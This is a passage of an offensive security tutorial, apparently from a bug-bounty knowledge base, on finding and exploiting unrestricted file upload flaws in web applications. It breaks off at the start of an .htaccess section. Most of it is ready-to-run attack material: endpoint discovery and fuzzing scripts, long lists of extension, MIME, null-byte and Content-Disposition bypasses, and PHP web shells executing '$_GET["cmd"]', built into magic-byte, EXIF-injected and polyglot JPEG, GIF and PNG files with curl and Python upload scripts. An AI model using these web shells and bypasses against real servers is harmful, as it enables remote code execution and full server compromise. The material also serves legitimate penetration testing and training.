---
title: Unrestricted File Upload
description: Discovering and exploiting unrestricted file upload vulnerabilities in web applications.
navigation:
  icon: i-lucide-upload
  title: Unrestricted File Upload
---

## Overview

::badge
**OWASP Top 10 — A04:2021**
::

Unrestricted file upload vulnerabilities occur when a web application allows users to upload files without properly validating file type, content, size, or storage location. Attackers exploit this to upload malicious files — achieving **Remote Code Execution (RCE)**, **Cross-Site Scripting (XSS)**, **Server-Side Request Forgery (SSRF)**, or **full server compromise**.

::note
File upload is one of the most critical attack surfaces in bug bounty. A single bypass can escalate from low to critical severity instantly.
::

---

## Attack Flow Diagram

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---
```
┌─────────────────────────────────────────────────────────────────┐
│                   FILE UPLOAD ATTACK FLOW                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────┐    ┌──────────────┐    ┌───────────────────┐     │
│  │ Discover │───▶│ Analyze      │───▶│ Identify Filter   │     │
│  │ Upload   │    │ Upload Form  │    │ Type              │     │
│  │ Endpoint │    │ & Parameters │    │ (Client/Server)   │     │
│  └──────────┘    └──────────────┘    └─────────┬─────────┘     │
│                                                │               │
│                    ┌───────────────────────────┐│               │
│                    │                           ▼│               │
│  ┌─────────────────┴──┐  ┌──────────────────────────────┐      │
│  │ Client-Side Only   │  │ Server-Side Validation       │      │
│  │ ─ Disable JS       │  │ ─ Extension Blacklist        │      │
│  │ ─ Intercept Proxy  │  │ ─ Extension Whitelist        │      │
│  │ ─ Modify Request   │  │ ─ Content-Type Check         │      │
│  └────────┬───────────┘  │ ─ Magic Bytes Check          │      │
│           │              │ ─ File Content Analysis       │      │
│           │              │ ─ Image Re-rendering          │      │
│           │              └──────────────┬───────────────┘      │
│           ▼                             ▼                      │
│  ┌──────────────────────────────────────────────────────┐      │
│  │              BYPASS TECHNIQUES                       │      │
│  │  ─ Double Extensions    ─ Null Byte Injection       │      │
│  │  ─ Case Manipulation    ─ MIME Type Spoofing        │      │
│  │  ─ Magic Bytes Prepend  ─ Polyglot Files            │      │
│  │  ─ .htaccess Upload     ─ Race Conditions           │      │
│  │  ─ Unicode/Encoding     ─ Content-Length Tricks     │      │
│  └──────────────────────┬───────────────────────────────┘      │
│                         ▼                                      │
│  ┌──────────────────────────────────────────────────────┐      │
│  │              EXPLOITATION                            │      │
│  │  ─ Webshell Upload (RCE)   ─ XSS via SVG/HTML      │      │
│  │  ─ XXE via DOCX/SVG        ─ SSRF via SVG/PDF      │      │
│  │  ─ Path Traversal Write    ─ DoS via Large Files    │      │
│  │  ─ Overwrite Config Files  ─ Deserialization        │      │
│  └──────────────────────────────────────────────────────┘      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#code
```
Attack Flow: Discover → Analyze → Identify Filter → Bypass → Exploit
```
::

---

## Reconnaissance & Discovery

### Finding Upload Endpoints

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Endpoint Discovery"}
  ```bash
  # Crawl target for upload forms
  katana -u https://target.com -d 5 -jc | grep -iE "upload|file|attach|import|avatar|photo|document|media"

  # Spider with Burp-style wordlist
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,301,302 | grep -iE "upload|file|import"

  # Discover upload endpoints via directory brute
  gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 | grep -iE "upload|file|media|attach"

  # Feroxbuster recursive scan
  feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,jsp -t 100 --filter-status 404

  # Find upload forms in JavaScript files
  katana -u https://target.com -jc -d 3 -ef css,png,jpg | httpx -mc 200 | tee js_urls.txt
  grep -rn "upload\|formData\|multipart\|file-input\|dropzone" js_urls.txt

  # Nuclei scan for upload endpoints
  nuclei -u https://target.com -t http/exposed-panels/ -t http/misconfiguration/ | grep -i upload

  # Wayback machine for historical upload endpoints
  waybackurls target.com | grep -iE "upload|file|attach|import|media|image|photo|document" | sort -u | tee upload_endpoints.txt

  # GAU (GetAllURLs) for broader coverage
  gau target.com --threads 5 | grep -iE "upload|attach|file|import" | sort -u

  # Check for API upload endpoints
  ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,405
  ffuf -u https://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -mc 200,405
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Common Endpoints"}
  ```
  /upload
  /upload.php
  /file-upload
  /api/upload
  /api/v1/upload
  /api/v1/files
  /api/attachments
  /admin/upload
  /wp-admin/upload.php
  /editor/upload
  /ckeditor/upload
  /tinymce/upload
  /elfinder/connector
  /filemanager/upload
  /media/upload
  /images/upload
  /avatar/upload
  /profile/photo
  /settings/avatar
  /import
  /bulk-import
  /resume/upload
  /documents/upload
  /assets/upload
  /static/upload
  /cms/upload
  /admin/media
  /panel/upload
  /dashboard/upload
  /user/profile/picture
  /account/avatar
  /support/ticket/attachment
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="JS Analysis"}
  ```bash
  # Extract upload-related JavaScript patterns
  cat js_urls.txt | while read url; do
    curl -s "$url" | grep -oP '(upload|file|attach|multipart)[^"'\'']*' 
  done | sort -u

  # LinkFinder for API endpoints in JS
  python3 linkfinder.py -i https://target.com/static/app.js -o cli | grep -iE "upload|file|attach"

  # SecretFinder for keys and endpoints
  python3 SecretFinder.py -i https://target.com/static/app.js -o cli

  # Extract all form actions
  curl -s https://target.com | grep -oP 'action="[^"]*"' | grep -iE "upload|file"

  # Check for multipart form-data references
  curl -s https://target.com | grep -oP 'enctype="multipart/form-data"'

  # Find Dropzone.js or similar upload library configurations
  curl -s https://target.com | grep -iE "dropzone|filepond|uppy|plupload|blueimp|resumable"
  ```
  :::
::

---

### Technology Fingerprinting

::tip
Always fingerprint the backend technology first. The bypass technique depends entirely on the server stack.
::

::code-group
```bash [Wappalyzer CLI]
# Identify backend technology
wappalyzer https://target.com

# Whatweb fingerprint
whatweb https://target.com -v

# Webanalyze
webanalyze -host https://target.com -crawl 2

# HTTP headers analysis
curl -sI https://target.com | grep -iE "server|x-powered|x-aspnet|x-generator"
```

```bash [Manual Fingerprint]
# Check server headers
curl -sI https://target.com | head -20

# Check common technology paths
curl -sI https://target.com/wp-login.php       # WordPress
curl -sI https://target.com/administrator       # Joomla
curl -sI https://target.com/user/login          # Drupal
curl -sI https://target.com/elmah.axd           # ASP.NET
curl -sI https://target.com/web.config          # IIS/ASP.NET
curl -sI https://target.com/WEB-INF/web.xml     # Java/Tomcat

# Extension probing
curl -so /dev/null -w "%{http_code}" https://target.com/test.php
curl -so /dev/null -w "%{http_code}" https://target.com/test.asp
curl -so /dev/null -w "%{http_code}" https://target.com/test.aspx
curl -so /dev/null -w "%{http_code}" https://target.com/test.jsp
```

```bash [Nuclei Tech Detection]
nuclei -u https://target.com -t http/technologies/ -silent
nuclei -u https://target.com -tags tech -silent
```
::

::collapsible
**Technology → Dangerous Extension Mapping**

| Technology | Dangerous Extensions |
| --- | --- |
| **PHP/Apache** | `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phar`, `.phps`, `.pgif`, `.shtml`, `.inc` |
| **ASP.NET/IIS** | `.asp`, `.aspx`, `.ashx`, `.asmx`, `.ascx`, `.config`, `.cshtml`, `.vbhtml`, `.cer`, `.asa`, `.aspq` |
| **Java/Tomcat** | `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`, `.war`, `.jar` |
| **Python** | `.py`, `.pyw`, `.pyc`, `.pyo` |
| **Ruby** | `.rb`, `.erb`, `.rhtml` |
| **Perl** | `.pl`, `.pm`, `.cgi` |
| **Node.js** | `.js`, `.mjs`, `.json` (config overwrite) |
| **ColdFusion** | `.cfm`, `.cfml`, `.cfc` |
| **SSI** | `.shtml`, `.stm`, `.shtm` |
| **General** | `.svg` (XSS), `.html` (XSS), `.xml` (XXE), `.xsl` (XSLT injection) |
::

---

## Filter Identification

::warning
Before attempting any bypass, determine what type of validation is in place. Blind fuzzing wastes time.
::

::accordion
  :::accordion-item{icon="i-lucide-monitor" label="Client-Side Validation Detection"}
  ```bash
  # Check for JavaScript-based validation
  curl -s https://target.com/upload | grep -iE "accept=|file-type|allowedExtensions|validateFile|checkFile"

  # Look for accept attribute restrictions
  curl -s https://target.com/upload | grep -oP 'accept="[^"]*"'
  # Example output: accept=".jpg,.png,.gif"

  # Indicators of client-side only validation:
  # 1. JavaScript alerts on wrong file type
  # 2. File input 'accept' attribute
  # 3. Form validation before submission
  # 4. No server response difference when bypassed via proxy

  # Bypass: Simply intercept with Burp Suite and modify the request
  # Client-side validation is NEVER a security control
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Server-Side Validation Detection"}
  ```bash
  # Test 1: Upload legitimate file (baseline)
  curl -X POST https://target.com/upload \
    -F "file=@legitimate.jpg" -v 2>&1 | tail -20

  # Test 2: Upload with wrong extension but correct MIME
  curl -X POST https://target.com/upload \
    -F "file=@test.php;type=image/jpeg" -v 2>&1 | tail -20

  # Test 3: Upload with correct extension but wrong MIME
  cp shell.php shell.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.jpg;type=application/x-php" -v 2>&1 | tail -20

  # Test 4: Upload with double extension
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg" -v 2>&1 | tail -20

  # Test 5: Upload with null byte
  curl -X POST https://target.com/upload \
    -F "file=@shell.php%00.jpg" -v 2>&1 | tail -20

  # Compare responses to identify which validation is used
  # - Extension blacklist: blocks .php but allows .phtml
  # - Extension whitelist: only allows .jpg, .png, .gif
  # - MIME type check: checks Content-Type header
  # - Magic bytes check: reads first bytes of file
  # - Content analysis: parses file as image
  ```
  :::

  :::accordion-item{icon="i-lucide-list-checks" label="Validation Matrix Testing"}
  ```bash
  # Create test matrix script
  #!/bin/bash
  TARGET="https://target.com/upload"
  COOKIE="session=YOUR_SESSION_COOKIE"
  FIELD="file"  # form field name

  echo "=== Extension Blacklist Test ==="
  for ext in php php3 php4 php5 php7 pht phtml phar phps pgif shtml; do
    echo "test" > "test.$ext"
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
      -b "$COOKIE" -F "$FIELD=@test.$ext")
    echo ".$ext -> HTTP $STATUS"
    rm "test.$ext"
  done

  echo ""
  echo "=== MIME Type Test ==="
  echo "<?php phpinfo(); ?>" > test.php
  for mime in "image/jpeg" "image/png" "image/gif" "text/plain" "application/octet-stream"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
      -b "$COOKIE" -F "$FIELD=@test.php;type=$mime")
    echo "MIME: $mime -> HTTP $STATUS"
  done

  echo ""
  echo "=== Case Sensitivity Test ==="
  for ext in PHP Php pHp phP PHp PhP pHP; do
    echo "test" > "test.$ext"
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
      -b "$COOKIE" -F "$FIELD=@test.$ext")
    echo ".$ext -> HTTP $STATUS"
    rm "test.$ext"
  done
  ```
  :::
::

---

## Extension Bypass Techniques

### Double Extension & Parsing Tricks

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Double Extensions"}
  ```bash
  # Apache parses rightmost known extension (with misconfigured AddHandler)
  # If Apache doesn't know .jpg but knows .php, it processes as PHP

  # Double extension payloads
  shell.php.jpg
  shell.php.png
  shell.php.gif
  shell.php.bmp
  shell.php.txt
  shell.php.pdf
  shell.php.doc
  shell.php.jpeg
  shell.php.xxx       # Unknown extension — Apache may fall back to .php

  # Reverse double extension (some parsers check first extension)
  shell.jpg.php
  shell.png.php
  shell.gif.php

  # Triple extensions
  shell.php.jpg.png
  shell.jpg.php.png

  # Upload via curl with double extension
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg;type=image/jpeg" \
    -b "session=COOKIE_VALUE" -v

  # Test if uploaded file executes
  curl https://target.com/uploads/shell.php.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Null Byte Injection"}
  ```bash
  # Null byte terminates string in C-based parsers
  # Server sees: shell.php%00.jpg → saves as shell.php

  # URL-encoded null byte
  shell.php%00.jpg
  shell.php%00.png
  shell.php%00.gif

  # Actual null byte in filename (Burp/Python)
  python3 -c "
  import requests
  files = {'file': ('shell.php\x00.jpg', open('shell.php','rb'), 'image/jpeg')}
  r = requests.post('https://target.com/upload', files=files, cookies={'session':'COOKIE'})
  print(r.status_code, r.text[:200])
  "

  # Double URL-encoded null byte
  shell.php%2500.jpg

  # Null byte variations
  shell.php\x00.jpg
  shell.php\0.jpg
  shell.php%00%00.jpg
  shell.php\u0000.jpg

  # Works on: PHP < 5.3.4, older Java, some Node.js parsers
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Semicolon & Special Chars"}
  ```bash
  # IIS semicolon trick — IIS ignores everything after semicolon
  shell.asp;.jpg
  shell.asp;jpg
  shell.aspx;.jpg
  shell.aspx;1.jpg

  # Upload via curl
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.asp;.jpg" \
    -b "session=COOKIE"

  # Colon trick (Windows NTFS Alternate Data Streams)
  shell.asp::$DATA
  shell.asp::$DATA.jpg
  shell.php::$DATA

  # Backslash trick (path normalization)
  ..\\shell.php
  ....\\\\shell.php

  # URL-encoded special characters
  shell.php%0a.jpg         # Newline
  shell.php%0d.jpg         # Carriage return
  shell.php%09.jpg         # Tab
  shell.php%20.jpg         # Space
  shell.php%0d%0a.jpg      # CRLF
  shell.p%68p              # URL-encoded 'h'
  ```
  :::
::

### Case Manipulation & Encoding

::code-group
```bash [Case Variations]
# Case manipulation — bypasses case-sensitive blacklists
shell.PHP
shell.Php
shell.pHp
shell.phP
shell.pHP
shell.PHp
shell.PhP

# ASP variants
shell.ASP
shell.Asp
shell.aSP
shell.ASPX
shell.Aspx
shell.aSpX

# JSP variants
shell.JSP
shell.Jsp
shell.jSP

# Automated case permutation
python3 -c "
import itertools
ext = 'php'
for combo in itertools.product(*[(c.lower(), c.upper()) for c in ext]):
    print('shell.' + ''.join(combo))
"
```

```bash [Unicode & Encoding Tricks]
# Unicode normalization bypasses
shell.p\u0068p           # Unicode 'h'
shell.ph\u0070           # Unicode 'p'
shell.ⓟⓗⓟ              # Circled letters
shell.㎰㏋㎰              # Unicode abuse

# Overlong UTF-8 encoding
shell.ph%c0%70           # Overlong encoding of 'p'
shell.%70%68%70          # Full URL-encoded .php

# Right-to-Left Override (RTLO)
# Filename appears as: shellgpj.php but is actually shell[RTLO]php.jpg
# Unicode char: U+202E

python3 -c "
rtlo = '\u202e'
filename = f'shell{rtlo}gpj.php'
print(f'Filename: {filename}')
print(f'Bytes: {filename.encode()}')"

# HTML entity encoding (some parsers)
shell.&#112;&#104;&#112;
```

```bash [Whitespace & Dot Tricks]
# Trailing dots (Windows strips them)
shell.php.
shell.php..
shell.php...
shell.asp.

# Trailing spaces (Windows strips them)
shell.php%20
shell.php%20%20
shell.asp%20

# Trailing slash
shell.php/
shell.php/x

# Mixed trailing characters
shell.php .
shell.php. .
shell.php . . 
shell.php.....   .   .

# Leading dot
.shell.php
..shell.php

# Upload tests via curl
for payload in "shell.php." "shell.php.." "shell.php%20" "shell.php/"; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
    -F "file=@shell.php;filename=$payload" -b "session=COOKIE")
  echo "$payload -> HTTP $STATUS"
done
```
::

---

### Alternative Executable Extensions

::caution
Always test ALL alternative extensions. Many blacklists miss lesser-known executable extensions.
::

::code-collapse
```bash [Complete Extension Fuzzing]
#!/bin/bash
# Comprehensive extension bypass fuzzer
TARGET="https://target.com/upload"
COOKIE="session=YOUR_SESSION"
FIELD="file"

# PHP extensions
PHP_EXTS="php php2 php3 php4 php5 php6 php7 php8 pht phtm phtml phps pgif phar phpt pht7 phpt inc"

# ASP/ASPX extensions
ASP_EXTS="asp aspx ashx asmx ascx config cshtml vbhtml cer asa aspq axd cshtm cshtml rem soap vbhtm vbhtml asa"

# JSP extensions
JSP_EXTS="jsp jspx jsw jsv jspf war"

# Other executable extensions
OTHER_EXTS="cgi pl pm py pyw rb erb rhtml cfm cfml cfc shtml stm shtm"

# XSS/XXE extensions
CLIENT_EXTS="svg svgz html htm xhtml xml xsl xslt"

echo "=== PHP Extension Fuzzing ==="
for ext in $PHP_EXTS; do
  echo '<?php echo "EXECUTED"; ?>' > "test.$ext"
  RESPONSE=$(curl -s -o /tmp/upload_response.txt -w "%{http_code}" -X POST "$TARGET" \
    -F "$FIELD=@test.$ext;type=application/octet-stream" -b "$COOKIE")
  BODY=$(cat /tmp/upload_response.txt)
  echo ".$ext -> HTTP $RESPONSE"
  rm "test.$ext"
done

echo ""
echo "=== ASP Extension Fuzzing ==="
for ext in $ASP_EXTS; do
  echo '<%= "EXECUTED" %>' > "test.$ext"
  RESPONSE=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -F "$FIELD=@test.$ext;type=application/octet-stream" -b "$COOKIE")
  echo ".$ext -> HTTP $RESPONSE"
  rm "test.$ext"
done

echo ""
echo "=== JSP Extension Fuzzing ==="
for ext in $JSP_EXTS; do
  echo '<%= "EXECUTED" %>' > "test.$ext"
  RESPONSE=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -F "$FIELD=@test.$ext;type=application/octet-stream" -b "$COOKIE")
  echo ".$ext -> HTTP $RESPONSE"
  rm "test.$ext"
done

echo ""
echo "=== Client-Side (XSS/XXE) Extension Fuzzing ==="
for ext in $CLIENT_EXTS; do
  echo '<svg onload=alert(1)>' > "test.$ext"
  RESPONSE=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -F "$FIELD=@test.$ext;type=application/octet-stream" -b "$COOKIE")
  echo ".$ext -> HTTP $RESPONSE"
  rm "test.$ext"
done
```
::

---

## Content-Type & MIME Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="MIME Type Spoofing"}
  ```bash
  # Change Content-Type header in multipart upload
  # Burp Suite: Intercept → Change Content-Type value

  # Upload PHP shell with image MIME type
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/jpeg" \
    -b "session=COOKIE" -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/png" \
    -b "session=COOKIE" -v

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/gif" \
    -b "session=COOKIE" -v

  # Common MIME types for bypass
  # image/jpeg
  # image/png
  # image/gif
  # image/bmp
  # image/webp
  # image/svg+xml
  # text/plain
  # application/octet-stream
  # application/pdf
  # application/x-httpd-php   (may trigger execution on misconfigured servers)

  # Double Content-Type (some parsers take first, some take last)
  # In Burp, modify raw request:
  # Content-Type: image/jpeg
  # Content-Type: application/x-php

  # Automated MIME fuzzing
  MIMES="image/jpeg image/png image/gif image/bmp image/webp text/plain application/octet-stream application/pdf application/x-httpd-php text/html application/xml image/svg+xml"
  for mime in $MIMES; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@shell.php;type=$mime" -b "session=COOKIE")
    echo "MIME: $mime -> HTTP $STATUS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Content-Disposition Tricks"}
  ```bash
  # Modify Content-Disposition in Burp Suite raw request
  
  # Standard format:
  # Content-Disposition: form-data; name="file"; filename="shell.php"

  # Double filename (some parsers take second)
  # Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"

  # Filename with path separator
  # Content-Disposition: form-data; name="file"; filename="../shell.php"
  # Content-Disposition: form-data; name="file"; filename="..\\shell.php"

  # Filename with quotes manipulation
  # Content-Disposition: form-data; name="file"; filename="shell.php".jpg
  # Content-Disposition: form-data; name="file"; filename='shell.php'
  # Content-Disposition: form-data; name="file"; filename="shell.php;.jpg"

  # Filename encoding
  # Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
  # Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

  # Newline injection in filename
  # Content-Disposition: form-data; name="file"; filename="shell.php
  # .jpg"

  # Missing quotes
  # Content-Disposition: form-data; name="file"; filename=shell.php

  # Python script for Content-Disposition fuzzing
  python3 -c "
  import requests

  url = 'https://target.com/upload'
  cookies = {'session': 'COOKIE'}

  payloads = [
      ('shell.php', 'image/jpeg'),
      ('shell.php\\x00.jpg', 'image/jpeg'),
      ('shell.php/.jpg', 'image/jpeg'),
      ('../shell.php', 'image/jpeg'),
      ('shell.php;.jpg', 'image/jpeg'),
  ]

  for filename, mime in payloads:
      files = {'file': (filename, open('shell.php','rb'), mime)}
      r = requests.post(url, files=files, cookies=cookies)
      print(f'{filename} -> {r.status_code}')
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Multipart Boundary Tricks"}
  ```bash
  # Custom boundary manipulation in Burp Suite
  # Some WAFs fail to parse unusual boundaries

  # Standard multipart:
  # Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  # Boundary with special characters
  # Content-Type: multipart/form-data; boundary=----=_Part_12345
  # Content-Type: multipart/form-data; boundary="boundary with spaces"
  # Content-Type: multipart/form-data; boundary=--boundarywithextralength$(python3 -c "print('A'*200)")

  # Double boundary definition
  # Content-Type: multipart/form-data; boundary=safe; boundary=evil

  # Mixed case
  # Content-Type: Multipart/Form-Data; boundary=test
  # CONTENT-TYPE: multipart/form-data; boundary=test

  # Extra whitespace
  # Content-Type:  multipart/form-data ;  boundary = test

  # Python script for boundary abuse
  python3 << 'EOF'
  import requests

  url = "https://target.com/upload"

  # Craft raw multipart with unusual boundary
  boundary = "----evil" + "A" * 500
  body = f"""--{boundary}\r
  Content-Disposition: form-data; name="file"; filename="shell.php"\r
  Content-Type: image/jpeg\r
  \r
  <?php system($_GET['cmd']); ?>\r
  --{boundary}--\r
  """

  headers = {
      "Content-Type": f"multipart/form-data; boundary={boundary}",
      "Cookie": "session=COOKIE"
  }

  r = requests.post(url, data=body, headers=headers)
  print(r.status_code, r.text[:300])
  EOF
  ```
  :::
::

---

## Magic Bytes & Content Bypass

### Magic Bytes Prepending

::note
Magic bytes (file signatures) are the first few bytes of a file that identify its format. Many validators check these bytes instead of the extension.
::

::code-group
```bash [Magic Bytes + Shell]
# GIF header + PHP shell
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif.php

# GIF87a variant
printf 'GIF87a\n<?php system($_GET["cmd"]); ?>' > shell.gif.php

# JPEG header + PHP shell (FFD8FF = JPEG magic bytes)
printf '\xff\xd8\xff\xe0\n<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# PNG header + PHP shell
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php

# BMP header + PHP shell
printf 'BM<?php system($_GET["cmd"]); ?>' > shell.bmp.php

# PDF header + PHP shell
printf '%%PDF-1.5\n<?php system($_GET["cmd"]); ?>' > shell.pdf.php

# ZIP header + PHP shell (PK magic bytes)
printf 'PK\x03\x04<?php system($_GET["cmd"]); ?>' > shell.zip.php

# Verify magic bytes
file shell.gif.php
xxd shell.gif.php | head -5

# Upload with correct MIME
curl -X POST https://target.com/upload \
  -F "file=@shell.gif.php;type=image/gif" \
  -b "session=COOKIE"
```

```bash [Python Magic Byte Injector]
python3 << 'PYEOF'
import struct

# GIF89a + PHP shell
gif_header = b'GIF89a'
php_shell = b'\n<?php system($_GET["cmd"]); ?>'
with open('shell_gif.php', 'wb') as f:
    f.write(gif_header + php_shell)

# JPEG + PHP shell
jpeg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01'
with open('shell_jpg.php', 'wb') as f:
    f.write(jpeg_header + php_shell)

# PNG + PHP shell
png_header = b'\x89PNG\r\n\x1a\n'
with open('shell_png.php', 'wb') as f:
    f.write(png_header + php_shell)

# PDF + PHP shell
pdf_header = b'%PDF-1.4\n'
with open('shell_pdf.php', 'wb') as f:
    f.write(pdf_header + php_shell)

# Verify
import subprocess
for f in ['shell_gif.php', 'shell_jpg.php', 'shell_png.php', 'shell_pdf.php']:
    result = subprocess.run(['file', f], capture_output=True, text=True)
    print(result.stdout.strip())
PYEOF
```

```bash [ExifTool Injection]
# Inject PHP code into EXIF metadata of a real image
# This passes both magic byte AND image re-rendering checks (sometimes)

# Install exiftool
# apt install libimage-exiftool-perl

# Inject into Comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
cp legit.jpg shell.php.jpg

# Inject into DocumentName
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' legit.jpg

# Inject into UserComment
exiftool -UserComment='<?php system($_GET["cmd"]); ?>' legit.jpg

# Inject into Artist field
exiftool -Artist='<?php echo shell_exec($_GET["cmd"]); ?>' legit.jpg

# Inject into multiple fields
exiftool \
  -Comment='<?php system($_GET["cmd"]); ?>' \
  -Artist='<?php system($_GET["cmd"]); ?>' \
  -DocumentName='<?php system($_GET["cmd"]); ?>' \
  legit.jpg

# Verify injection
exiftool legit.jpg | grep -i "php"
strings legit.jpg | grep "php"

# Create minimal valid JPEG with PHP in EXIF
python3 << 'EOF'
from PIL import Image
import piexif

# Create minimal image
img = Image.new('RGB', (10, 10), color='red')

# Add EXIF with PHP payload
exif_dict = {"0th": {piexif.ImageIFD.ImageDescription: b'<?php system($_GET["cmd"]); ?>'}}
exif_bytes = piexif.dump(exif_dict)

img.save("exif_shell.jpg", "jpeg", exif=exif_bytes)
print("Created exif_shell.jpg")
EOF
```
::

### Polyglot Files

::warning
Polyglot files are valid in multiple formats simultaneously. They pass strict content validation while still being executable.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JPEG-PHP Polyglot"}
  ```bash
  # Method 1: Using jhead to inject into JPEG comment
  cp real_image.jpg polyglot.php.jpg
  jhead -ce polyglot.php.jpg
  # In the editor that opens, add: <?php system($_GET['cmd']); ?>

  # Method 2: Python JPEG polyglot creator
  python3 << 'POLYEOF'
  # Creates a valid JPEG that is also valid PHP
  import struct

  # Minimal valid JPEG
  jpeg = bytearray()
  # SOI marker
  jpeg += b'\xff\xd8'
  # APP0 marker with JFIF
  jpeg += b'\xff\xe0'
  jpeg += struct.pack('>H', 16)  # Length
  jpeg += b'JFIF\x00'
  jpeg += b'\x01\x01'  # Version
  jpeg += b'\x00'       # Units
  jpeg += struct.pack('>HH', 1, 1)  # Density
  jpeg += b'\x00\x00'   # Thumbnail

  # COM marker with PHP payload
  php_payload = b'<?php system($_GET["cmd"]); ?>'
  jpeg += b'\xff\xfe'  # COM marker
  jpeg += struct.pack('>H', len(php_payload) + 2)
  jpeg += php_payload

  # Minimal frame and scan (makes it renderable)
  # SOF0
  jpeg += b'\xff\xc0'
  jpeg += b'\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
  # DHT
  jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
  # SOS
  jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x7b\x40'
  # EOI
  jpeg += b'\xff\xd9'

  with open('polyglot.php.jpg', 'wb') as f:
      f.write(jpeg)

  print("Created polyglot.php.jpg")
  import subprocess
  print(subprocess.run(['file', 'polyglot.php.jpg'], capture_output=True, text=True).stdout)
  POLYEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="GIF-PHP Polyglot"}
  ```bash
  # Simple GIF89a polyglot
  python3 << 'GIFEOF'
  # GIF89a header is also valid PHP (GIF89a is treated as constant/text)
  payload = b'GIF89a'
  payload += b'<?php system($_GET["cmd"]); ?>'
  # Add minimal GIF structure
  payload += b'\x01\x00\x01\x00\x00\x00\x00;'

  with open('polyglot.gif', 'wb') as f:
      f.write(payload)

  # Also save as .php for testing
  with open('polyglot.gif.php', 'wb') as f:
      f.write(payload)

  import subprocess
  print(subprocess.run(['file', 'polyglot.gif'], capture_output=True, text=True).stdout)
  GIFEOF

  # Even simpler — one-liner
  echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.gif.php
  file polyglot.gif.php
  # Output: GIF image data, version 89a
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PNG-PHP Polyglot"}
  ```bash
  # PNG polyglot using tEXt chunk
  python3 << 'PNGEOF'
  import struct
  import zlib

  def create_chunk(chunk_type, data):
      chunk = chunk_type + data
      return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)

  png = b'\x89PNG\r\n\x1a\n'

  # IHDR chunk (1x1 pixel, 8-bit RGB)
  ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
  png += create_chunk(b'IHDR', ihdr_data)

  # tEXt chunk with PHP payload
  php_payload = b'Comment\x00<?php system($_GET["cmd"]); ?>'
  png += create_chunk(b'tEXt', php_payload)

  # IDAT chunk (minimal image data)
  raw_data = b'\x00\x00\x00\x00'  # filter byte + RGB
  compressed = zlib.compress(raw_data)
  png += create_chunk(b'IDAT', compressed)

  # IEND chunk
  png += create_chunk(b'IEND', b'')

  with open('polyglot.png.php', 'wb') as f:
      f.write(png)

  import subprocess
  print(subprocess.run(['file', 'polyglot.png.php'], capture_output=True, text=True).stdout)
  PNGEOF
  ```
  :::
::

---

## Server Configuration File Upload

::caution
Uploading server configuration files can change how the server processes files in the upload directory. This is one of the most powerful bypass techniques.
::

### .htaccess Upload (Apache)

::tabs
  :::tabs-item{icon="i-lucide-terminal" label=".htaccess Payloads"}
  ```bash
  # Payload 1: Make .jpg files execute as PHP
